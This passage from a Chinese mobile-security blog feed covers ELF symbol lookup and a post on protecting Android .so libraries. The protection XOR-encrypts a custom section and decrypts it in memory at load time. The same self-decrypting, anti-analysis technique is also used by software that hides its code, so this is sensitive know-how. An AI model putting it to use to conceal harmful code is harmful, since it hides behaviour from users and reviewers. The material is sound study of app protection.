funcName 目标函数</span><br><span class="line"> * @param info  函数的结构信息</span><br><span class="line"> * @return</span><br><span class="line"> *&#x2F;</span><br><span class="line">static char getTargetFuncInfo(unsigned long base_addr, const char *funcName, funcInfo *info) &#123;</span><br><span class="line">    Elf32_Ehdr *ehdr;</span><br><span class="line">    Elf32_Phdr *phdr;</span><br><span class="line">    &#x2F;** elf header **&#x2F;</span><br><span class="line">    ehdr &#x3D; (Elf32_Ehdr *) base_addr;</span><br><span class="line">    &#x2F;** 程序头部表结构 **&#x2F;</span><br><span class="line">    phdr &#x3D; (Elf32_Phdr *) (base_addr + ehdr-&gt;e_phoff);</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;phdr &#x3D;  0x%p, size &#x3D; 0x%x\n&quot;, phdr, ehdr-&gt;e_phnum);</span><br><span class="line">    int i &#x3D; 0, isFind &#x3D; 1;</span><br><span class="line">    &#x2F;** 在程序头部表结构定位.dynamic段 **&#x2F;</span><br><span class="line">    for (i &#x3D; 0; i &lt; ehdr-&gt;e_phnum; ++i) &#123;</span><br><span class="line">__android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;phdr &#x3D;  0x%p\n&quot;, phdr);</span><br><span class="line">        if (phdr-&gt;p_type &#x3D;&#x3D; PT_DYNAMIC) &#123;</span><br><span class="line">            isFind &#x3D; 0;</span><br><span class="line">            print_debug(&quot;Find .dynamic segment&quot;);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        phdr++;</span><br><span class="line">    &#125;</span><br><span class="line">    if(isFind &#x3D;&#x3D; 0) goto _error;</span><br><span class="line">    &#x2F;** 找到.dynamic的虚拟地址和大小 **&#x2F;</span><br><span class="line">    Elf32_Off dynamic_vaddr &#x3D; base_addr + phdr-&gt;p_vaddr;</span><br><span class="line">    Elf32_Off dynamic_size &#x3D; phdr-&gt;p_filesz;</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;dynamic_vaddr &#x3D;  0x%x, dynamic_size &#x3D;  0x%x&quot;, dynamic_vaddr, dynamic_size);</span><br><span class="line">    &#x2F;** 查找.dynsym和.dynstr以及.hash节区的信息**&#x2F;</span><br><span class="line">    Elf32_Dyn *dyn;</span><br><span class="line">    Elf32_Addr dyn_symtab_offset, dyn_strtab_offset, dyn_hash_offset;</span><br><span class="line">    int flag &#x3D; 0;</span><br><span class="line">    for(i &#x3D; 0; i &lt; (dynamic_size &#x2F; sizeof(Elf32_Dyn)); i++)&#123;</span><br><span class="line">        dyn &#x3D; (Elf32_Dyn *)(dynamic_vaddr + i * sizeof(Elf32_Dyn));</span><br><span class="line">        if (dyn-&gt;d_tag &#x3D;&#x3D; DT_SYMTAB) &#123;</span><br><span class="line">            dyn_symtab_offset &#x3D; (dyn-&gt;d_un).d_ptr;</span><br><span class="line">            flag +&#x3D; 1;</span><br><span class="line">            __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;Find .dynsym section, addr &#x3D; 0x%x\n&quot;, dyn_symtab_offset);</span><br><span class="line">        &#125;</span><br><span class="line">        if (dyn-&gt;d_tag &#x3D;&#x3D; DT_HASH) &#123;</span><br><span class="line">            dyn_hash_offset &#x3D; (dyn-&gt;d_un).d_ptr;</span><br><span class="line">            flag +&#x3D; 2;</span><br><span class="line">            __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;Find .hash section, addr &#x3D; 0x%x\n&quot;, dyn_hash_offset);</span><br><span class="line">        &#125;</span><br><span class="line">        if (dyn-&gt;d_tag &#x3D;&#x3D; DT_STRTAB) &#123;</span><br><span class="line">            dyn_strtab_offset &#x3D; (dyn-&gt;d_un).d_ptr;</span><br><span class="line">            flag +&#x3D; 4;</span><br><span class="line">            __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;Find .dynstr section, addr &#x3D; 0x%x\n&quot;, dyn_strtab_offset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;** 如果没有找到，则出错，无法进行解密操作 **&#x2F;</span><br><span class="line">    if ((flag &amp; 0x0f) !&#x3D; 0x0f) &#123;</span><br><span class="line">        print_debug(&quot;Find needed .section failed\n&quot;);</span><br><span class="line">        goto _error;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;** 各个偏移加上虚拟基地址定位到实际映射的虚拟地址 **&#x2F;</span><br><span class="line">    dyn_symtab_offset +&#x3D; base_addr;</span><br><span class="line">    dyn_hash_offset +&#x3D; base_addr;</span><br><span class="line">    dyn_strtab_offset +&#x3D; base_addr;</span><br><span class="line"></span><br><span class="line">    unsigned funHash, nbucket;</span><br><span class="line">    unsigned *bucket, *chain;</span><br><span class="line">    funHash &#x3D; getElfHash(funcName);</span><br><span class="line">    &#x2F;** .dynsym结构信息 **&#x2F;</span><br><span class="line">    Elf32_Sym *funSym &#x3D; (Elf32_Sym *)dyn_symtab_offset;</span><br><span class="line">    &#x2F;** .dynstr结构信息 **&#x2F;</span><br><span class="line">    char *dynstr &#x3D; (char *)dyn_strtab_offset;</span><br><span class="line">    &#x2F;** .nbucket **&#x2F;</span><br><span class="line">    nbucket &#x3D; *((int *) dyn_hash_offset);</span><br><span class="line">    &#x2F;** 指向bucket，nbucket和nchian的两个值的大小为8，跳过这两个字段 **&#x2F;</span><br><span class="line">    bucket &#x3D; (unsigned int *) (dyn_hash_offset + 8);</span><br><span class="line">    &#x2F;** 指向chain**&#x2F;</span><br><span class="line">    chain &#x3D; (unsigned int *) (dyn_hash_offset + 4 * (2 + nbucket));</span><br><span class="line">    flag &#x3D; -1;</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;hash &#x3D; 0x%x, nbucket &#x3D; 0x%x\n&quot;, funHash, nbucket);</span><br><span class="line">    &#x2F;** 得到funcName的哈希值为funHash的符号索引 **&#x2F;</span><br><span class="line">    int sym_index &#x3D; (funHash % nbucket);</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;mod &#x3D; %d\n&quot;, sym_index);</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;i &#x3D; 0x%d\n&quot;, bucket[sym_index]);</span><br><span class="line">    &#x2F;** 循环查找funcName在符号表中的索引 **&#x2F;</span><br><span class="line">    for (i &#x3D; bucket[sym_index]; i !&#x3D; 0; i &#x3D; chain[i]) &#123;</span><br><span class="line">        __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;Find index &#x3D; %d\n&quot;, i);</span><br><span class="line">        if (strcmp(dynstr + (funSym + i)-&gt;st_name, funcName) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            flag &#x3D; 0;</span><br><span class="line">            __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;Find %s\n&quot;, funcName);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (flag) goto _error;</span><br><span class="line">    info-&gt;st_value &#x3D; (funSym + i)-&gt;st_value;</span><br><span class="line">    info-&gt;st_size &#x3D; (funSym + i)-&gt;st_size;</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;st_value &#x3D; %d, st_size &#x3D; %d&quot;, info-&gt;st_value, info-&gt;st_size);</span><br><span class="line">    return 0;</span><br><span class="line">    _error:</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;标签（空格分隔）： Apk逆向与保护&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1. 前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 前言&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;之前学习了简单对ELF文
      
    
    </summary>
    
    
      <category term="移动安全" scheme="https://blog.kaide0521.cn/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="App加固" scheme="https://blog.kaide0521.cn/tags/App%E5%8A%A0%E5%9B%BA/"/>
    
      <category term="so加固" scheme="https://blog.kaide0521.cn/tags/so%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>基于section加密的.so加固学习笔记</title>
    <link href="https://blog.kaide0521.cn/2020/01/07/%E5%9F%BA%E4%BA%8Esection%E5%8A%A0%E5%AF%86%E7%9A%84-so%E5%8A%A0%E5%9B%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.kaide0521.cn/2020/01/07/%E5%9F%BA%E4%BA%8Esection%E5%8A%A0%E5%AF%86%E7%9A%84-so%E5%8A%A0%E5%9B%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-01-07T13:38:19.000Z</published>
    <updated>2020-01-07T13:39:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>标签（空格分隔）： APK逆向与保护</p><hr><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>APK的加固技术研究已有很多年了，有很多成熟的厂商提供相关的服务，加固的目的一方面是为了保护应用不被恶意反编译和篡改，得到应用的源代码。另一方面防止应用中为发现的漏洞被攻击者发现利用。早期的加固技术主要是基于Dex文件实现的，通过将源程序的dex文件加密，在运行的过程中由解壳程序动态加载、解密和运行。但是由于基于dex的加固技术，很容易被破解，在内存中dump出dex文件，因此衍生了基于.so的加固技术，虽然基于.so的加固技术的安全性有所提高，但是道高一尺，魔高一丈，基于各种断点调试的人肉脱壳也是很容易恢复出dex文件，据说目前厂商又在研究基于vmp的加固技术，通过自定义指令和解释器等各种技术实现更高级保护等。作为一名“入坑”不久的菜鸟，在这里不谈那么多，先简单学习下基于so加固的基本原理，安全、逆向任重而道远啦<del>~</del></p><h2 id="2-so加固的基本思路"><a href="#2-so加固的基本思路" class="headerlink" title="2. so加固的基本思路"></a>2. so加固的基本思路</h2><p>前段时间，折腾了下ELF文件，对ELF文件有了基本的认识，虽然有些地方理解的还是比较模糊，比如ELF文件在动态加载、链接的细节方面，看了《深入理解计算机系统》之后，理解的还是不到位，期待神作《程序员的自我修养-链接、加载和库》到货，认真研读，以求理解的更加透彻。</p><p>古人学问无遗力，少壮工夫老始成。<br>纸上得来终觉浅，绝知此事要躬行。<br>                    ————陆游</p><p>看书归看书，还是得彻彻底底实践一遍</p><p>首先得感谢这些博主的无私分享<br>[<a href="http://bbs.pediy.com/thread-191649.htm][1]" target="_blank" rel="noopener">http://bbs.pediy.com/thread-191649.htm][1]</a><br>[<a href="http://blog.csdn.net/jiangwei0910410003/article/details/49966719][2]" target="_blank" rel="noopener">http://blog.csdn.net/jiangwei0910410003/article/details/49966719][2]</a><br>[<a href="http://zke1ev3n.me/2015/12/27/Android-So%E7%AE%80%E5%8D%95%E5%8A%A0%E5%9B%BA/][3]" target="_blank" rel="noopener">http://zke1ev3n.me/2015/12/27/Android-So%E7%AE%80%E5%8D%95%E5%8A%A0%E5%9B%BA/][3]</a><br>在这里，菜鸟我也是照着你们的神作，依葫芦画瓢，把整个过程梳理一遍，顺便写写自己的感受。<br>学习逆向的过程是艰辛的，<strong>But, 人皆向死而生，又有何所惧？</strong></p><p>好了，废话少说，言归正传</p><p>先来看实现so加固的两种基本思路：</p><h3 id="2-1-通过将核心函数实现在自定义section中，并进行加密"><a href="#2-1-通过将核心函数实现在自定义section中，并进行加密" class="headerlink" title="2.1 通过将核心函数实现在自定义section中，并进行加密"></a><strong>2.1 通过将核心函数实现在自定义section中，并进行加密</strong></h3><p>基本的思路是自定义一个section，然后将核心函数的实现放在自定义的section中，并且对其进行加密。然后我们再来看ELF文件的格式：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzA0MTkyMTIzOTE4?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>我们可以看到其中有两个section，分别是.init_array和.fini_array,前面一个在动态链接库加载到进程映像后执行一些初始化操作，后面的终止的时候执行。</p><p>也就是.init_array节中的代码先与程序的Main函数开始之前执行，因此我们只要将解密函数定义成.init_array属性的节中，就可以在main函数开始之前解密我们先已加密的section，正常调用其中的函数。</p><h3 id="2-2-1-加密过程"><a href="#2-2-1-加密过程" class="headerlink" title="2.2.1 加密过程"></a><strong>2.2.1 加密过程</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">     * 实现对so的section进行加密操作</span><br><span class="line">     *</span><br><span class="line">     * @param elfFilePath       输入的ELF文件路径</span><br><span class="line">     * @param outPath           加密操作完成后输出路径</span><br><span class="line">     * @param encodeSectionName 要进行加密的节区名称</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public static void doShell(String elfFilePath, String outPath, String encodeSectionName) &#123;</span><br><span class="line">        byte[] fileContent &#x3D; Utils.readFile(elfFilePath);</span><br><span class="line">        if (fileContent &#x3D;&#x3D; null) &#123;</span><br><span class="line">            System.out.println(&quot;read file byte failed...&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;** 首先将ELF文件解析成 ElfType32的对象格式，ElfType32封装了ELF文件各个部分的属性信息 *&#x2F;</span><br><span class="line">        ElfType32 type_32 &#x3D; ELFParser.parseElfToType32(fileContent);</span><br><span class="line">        &#x2F;** 对我们指定的section进行加密操作 *&#x2F;</span><br><span class="line">        doEncryptionSection(fileContent, type_32, encodeSectionName);</span><br><span class="line"></span><br><span class="line">        ElfType32 otype_32 &#x3D; ELFParser.parseElfToType32(fileContent);</span><br><span class="line"></span><br><span class="line">        Utils.saveFile(outPath, fileContent);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>具体加密过程如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> &#x2F;**</span><br><span class="line">     * 执行具体的加密操作</span><br><span class="line">     *</span><br><span class="line">     * @param fileByteArys</span><br><span class="line">     * @param type_32</span><br><span class="line">     * @param encodeSectionName</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private static void doEncryptionSection(byte[] fileByteArys, ElfType32 type_32, String encodeSectionName) &#123;</span><br><span class="line"></span><br><span class="line">        &#x2F;** ELFheader 定义了.shstrtab节区在节区头部表中的索引，也就是第几个表项 *&#x2F;</span><br><span class="line">        int shstrab_index &#x3D; Utils.byte2Short(type_32.hdr.e_shstrndx);</span><br><span class="line"></span><br><span class="line">        &#x2F;** 获取.shstrtab节区的结构,.shstrtab节区保存了各个节区的名称 *&#x2F;</span><br><span class="line">        elf32_shdr shdr &#x3D; type_32.shdrList.get(shstrab_index);</span><br><span class="line">        &#x2F;**.shstrtab节区的大小**&#x2F;</span><br><span class="line">        int shstrab_size &#x3D; Utils.byte2Int(shdr.sh_size);</span><br><span class="line">        &#x2F;**.shstrtab节区的偏移，相对于文件**&#x2F;</span><br><span class="line">        int shstrab_offset &#x3D; Utils.byte2Int(shdr.sh_offset);</span><br><span class="line">        &#x2F;** 记录要找的节区偏移**&#x2F;</span><br><span class="line">        int mySectionOffset &#x3D; 0;</span><br><span class="line">        &#x2F;** 记录要找的节区大小**&#x2F;</span><br><span class="line">        int mySectionSize &#x3D; 0;</span><br><span class="line"></span><br><span class="line">        &#x2F;** 找到名称为encodeSectionName的节区，并执行加密操作 *&#x2F;</span><br><span class="line">        for(elf32_shdr t_shdr : type_32.shdrList)&#123;</span><br><span class="line"></span><br><span class="line">            &#x2F;** t_shdr.sh_name定义了节区名称在.shstrtab节区中的大小偏移，可以理解为索引 **&#x2F;</span><br><span class="line">            int sectionNameOffset &#x3D; shstrab_offset + Utils.byte2Int(t_shdr.sh_name);</span><br><span class="line"></span><br><span class="line">            &#x2F;** 如果.shstrtab节区在sectionNameOffset偏移出的字符串与encodeSectionName相等，说明找到了**&#x2F;</span><br><span class="line">            if (Utils.isEqualByteAry(fileByteArys, sectionNameOffset, encodeSectionName)) &#123;</span><br><span class="line">                &#x2F;** 这里需要读取section段然后进行数据加密 **&#x2F;</span><br><span class="line">                mySectionOffset &#x3D; Utils.byte2Int(t_shdr.sh_offset);</span><br><span class="line">                mySectionSize &#x3D; Utils.byte2Int(t_shdr.sh_size);</span><br><span class="line">                byte[] sectionAry &#x3D; Utils.copyBytes(fileByteArys, mySectionOffset, mySectionSize);</span><br><span class="line">                for (int i &#x3D; 0; i &lt; sectionAry.length; i++) &#123;</span><br><span class="line">                    sectionAry[i] &#x3D; (byte) (sectionAry[i] ^ 0xFF);</span><br><span class="line">                &#125;</span><br><span class="line">                Utils.replaceByteAry(fileByteArys, mySectionOffset, sectionAry);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(mySectionOffset &#x3D;&#x3D; 0 &amp;&amp; mySectionSize &#x3D;&#x3D; 0)&#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;Can not find the section of &#39;encodeSectionName&#39; !&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;** 修改Elf Header中的e_entry和e_shoff值 为加密的section的offset和size</span><br><span class="line">         *</span><br><span class="line">         * 为什么要修改Header中的e_entry和e_shoff值呢？</span><br><span class="line">         *</span><br><span class="line">         * 1.方便解密的时候快速定位到加密的section，方便解密</span><br><span class="line">         *</span><br><span class="line">         * 既然修改了Header中的e_entry和e_shoff值，难道程序的加载运行的时候找不到入口地址，不会报错吗？</span><br><span class="line">         *</span><br><span class="line">         * 2.在这里我们又要理解下目标文件的装载视图和链接视图，首先对于动态库来说，程序被加载时，设定的跳转地址是动态连接器的地址</span><br><span class="line">         * 通过GOT表和PLT表实现动态调用，与e_entry无关，另外在装载过程中，用不到链接视图中的一些字段，比如e_shoff</span><br><span class="line">         * 所以这两个字段可以被额外数据填充.</span><br><span class="line">         *</span><br><span class="line">         * **&#x2F;</span><br><span class="line">        int nSize &#x3D; mySectionSize&#x2F;4096 + (mySectionSize%4096 &#x3D;&#x3D; 0 ? 0 : 1);</span><br><span class="line">        byte[] entry &#x3D; new byte[4];</span><br><span class="line">        entry &#x3D; Utils.int2Byte((mySectionSize&lt;&lt;16) + nSize);</span><br><span class="line">        Utils.replaceByteAry(fileByteArys, 24, entry);</span><br><span class="line">        byte[] offsetAry &#x3D; new byte[4];</span><br><span class="line">        offsetAry &#x3D; Utils.int2Byte(mySectionOffset);</span><br><span class="line">        Utils.replaceByteAry(fileByteArys, 32, offsetAry);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-2-解密过程"><a href="#2-2-2-解密过程" class="headerlink" title="2.2.2 解密过程"></a><strong>2.2.2 解密过程</strong></h3><p>由于很多细节的描述的代码中一一称述，这里就不啰嗦了</p><p><strong>1.首先我们见解密函数定义为</strong></p><pre><code>void init_decryption() __attribute__((constructor));</code></pre><p>函数声明为<strong>attribute</strong>((constructor))属性会先于Main函数之前执行</p><p><strong>2.然后，获取动态库加载在进程内存映像中的虚拟首地址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">unsigned long getLibVPAddr()&#123;</span><br><span class="line">    unsigned long ret &#x3D; 0;</span><br><span class="line">    char name[] &#x3D; &quot;libdemo.so&quot;;</span><br><span class="line">    char buf[4096], *temp;</span><br><span class="line">    int pid;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    pid &#x3D; getpid();</span><br><span class="line">    &#x2F;** 获取当前进程的虚拟地址映射表 **&#x2F;</span><br><span class="line">    sprintf(buf, &quot;&#x2F;proc&#x2F;%d&#x2F;maps&quot;, pid);</span><br><span class="line">    fp &#x3D; fopen(buf, &quot;r&quot;);</span><br><span class="line">    if(fp &#x3D;&#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        puts(&quot;open failed&quot;);</span><br><span class="line">        goto _error;</span><br><span class="line">    &#125;</span><br><span class="line">    while(fgets(buf, sizeof(buf), fp))&#123;</span><br><span class="line">        &#x2F;** 找到当前进程加载的so库的虚拟地址 **&#x2F;</span><br><span class="line">        if(strstr(buf, name))&#123;</span><br><span class="line">            temp &#x3D; strtok(buf, &quot;-&quot;);</span><br><span class="line">            ret &#x3D; strtoul(temp, NULL, 16);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    _error:</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.执行具体的解密过程</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">void init_decryption()&#123;</span><br><span class="line">    unsigned int nblock;</span><br><span class="line">    unsigned int nsize;</span><br><span class="line">    unsigned long base;</span><br><span class="line">    unsigned long text_addr;</span><br><span class="line">    &#x2F;** ELF Header 结构体指针 **&#x2F;</span><br><span class="line">    Elf32_Ehdr *elfHeader;</span><br><span class="line"></span><br><span class="line">    &#x2F;** 获取加载进内存的so的起始地址 **&#x2F;</span><br><span class="line">    base &#x3D; getLibVPAddr();</span><br><span class="line"></span><br><span class="line">    &#x2F;** 获取指定section的偏移值和size **&#x2F;</span><br><span class="line">    elfHeader &#x3D; (Elf32_Ehdr *)base;</span><br><span class="line">    &#x2F;** 在我们加密的过程中e_shoff保存的是目标section的偏移，此时加上基址就是目标section在内存中的虚拟地址 **&#x2F;</span><br><span class="line">    text_addr &#x3D; elfHeader-&gt;e_shoff + base;</span><br><span class="line">    &#x2F;** 获取目标section的字节空间大小 **&#x2F;</span><br><span class="line">    nblock &#x3D; elfHeader-&gt;e_entry &gt;&gt; 16;</span><br><span class="line">    &#x2F;** 获取目标section所占的页数，每页对应4 X 1024B **&#x2F;</span><br><span class="line">    nsize &#x3D; elfHeader-&gt;e_entry &amp; 0xffff;</span><br><span class="line"></span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;nblock &#x3D;  0x%x,nsize:%d&quot;, nblock,nsize);</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;base &#x3D;  0x%x&quot;, text_addr);</span><br><span class="line">    printf(&quot;nblock &#x3D; %d\n&quot;, nblock);</span><br><span class="line"></span><br><span class="line">    &#x2F;** 修改内存的操作权限，因为不同的虚拟地址空间的内存段是有权限限制的，比如代码段是只读，数据段：可读可写**&#x2F;</span><br><span class="line">    if(mprotect((void *) (text_addr &#x2F; PAGE_SIZE * PAGE_SIZE), 4096 * nsize, PROT_READ | PROT_EXEC | PROT_WRITE) !&#x3D; 0)&#123;</span><br><span class="line">        puts(&quot;mem privilege change failed&quot;);</span><br><span class="line">        __android_log_print(ANDROID_LOG_INFO, &quot;JNITag&quot;, &quot;mem privilege change failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    &#x2F;** 执行具体的解密操作 **&#x2F;</span><br><span class="line">    for(i&#x3D;0;i&lt; nblock; i++)&#123;</span><br><span class="line">        char *addr &#x3D; (char*)(text_addr + i);</span><br><span class="line">        *addr &#x3D; ~(*addr);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;** 解密完成后，要修改会权限 **&#x2F;</span><br><span class="line">    if(mprotect((void *) (text_addr &#x2F; PAGE_SIZE * PAGE_SIZE), 4096 * nsize, PROT_READ | PROT_EXEC) !&#x3D; 0)&#123;</span><br><span class="line">        puts(&quot;mem privilege change failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Decrypt success&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;标签（空格分隔）： APK逆向与保护&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1. 前言&quot;&gt;&lt;/a&gt;1. 前言&lt;/h2&gt;&lt;p&gt;APK的加固技术研究已有很多年了，有很多成熟的厂商提供相关
      
    
    </summary>
    
    
      <category term="移动安全" scheme="https://blog.kaide0521.cn/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="App加固" scheme="https://blog.kaide0521.cn/tags/App%E5%8A%A0%E5%9B%BA/"/>
    
      <category term="so加固" scheme="https://blog.kaide0521.cn/tags/so%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>Android Studio调试smali代码</title>
    <link href="https://blog.kaide0521.cn/2020/01/05/Android-Studio%E8%B0%83%E8%AF%95smali%E4%BB%A3%E7%A0%81/"/>
    <id>https://blog.kaide0521.cn/2020/01/05/Android-Studio%E8%B0%83%E8%AF%95smali%E4%BB%A3%E7%A0%81/</id>
    <published>2020-01-05T13:27:12.000Z</published>
    <updated>2020-01-05T13:30:16.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Android-Studio调试smali代码"><a href="#Android-Studio调试smali代码" class="headerlink" title="Android Studio调试smali代码"></a>Android Studio调试smali代码</h3><p>标签： APK逆向分析</p><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>经过一段时间的学习，现在总结下针对APK逆向的一些基本调试技术，以阿里移动安全比赛题目为例</p><h2 id="2-使用Android-Studio调试smali代码"><a href="#2-使用Android-Studio调试smali代码" class="headerlink" title="2. 使用Android Studio调试smali代码"></a>2. 使用Android Studio调试smali代码</h2><p>步骤一：下载安全Android Stuio,下载地址<a href="http://www.android-studio.org/" target="_blank" rel="noopener">http://www.android-studio.org/</a></p><p>步骤二：下载插件smalidea<br>地址: <a href="https://bitbucket.org/JesusFreke/smali/downloads" target="_blank" rel="noopener">https://bitbucket.org/JesusFreke/smali/downloads</a></p><p>步骤三：下载完成后，打开Android studio的Settings——&gt;Plugins，选择 Install plugin from disk</p><p><img 